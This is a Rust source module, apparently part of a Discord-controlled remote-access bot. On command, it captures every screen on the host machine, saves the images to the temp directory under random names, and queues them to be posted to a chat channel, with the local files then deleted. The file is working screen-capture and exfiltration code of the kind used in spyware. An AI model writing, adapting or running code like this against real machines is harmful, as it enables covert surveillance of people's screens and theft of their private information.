use std::{fs::File, io::{BufWriter, Write}, path::PathBuf, time::SystemTime};
use chrono::{DateTime, Local};
use rand::distributions::{Alphanumeric, DistString};
use screenshots::Screen;
use serde_json::json;
use crate::BOT_TO_SEND;
pub async fn main(channel_id: u64) { 
    let mut files= Vec::new();
    let screens= Screen::all().unwrap();
    for screen in screens {
        let image= screen.capture().unwrap();
        let buffer= image.buffer();
        let p= std::env::temp_dir().to_string_lossy().to_string() + &screen.display_info.id.to_string() + "-" + &Alphanumeric.sample_string(&mut rand::thread_rng(), 12) + ".png";
        let mut f= BufWriter::new(File::create(&p).unwrap());
        f.write_all(buffer).unwrap();
        f.flush().unwrap();
        drop(f);
        files.push(PathBuf::from(p));
    }
    BOT_TO_SEND.lock().await.push(json!({
        "channel": channel_id,
        "embed": true,
        "color": 0x0084ff,
        "title": format!("{} **`[On Demand]`**", Into::<DateTime<Local>>::into(SystemTime::now()).format("%d/%m/%Y %r")),
        "files": &files,
        "image": format!("attachment://{}", files.last().unwrap().file_name().unwrap().to_string_lossy()),
        "react": ["📌"],
        "delete_files": true
    }));
}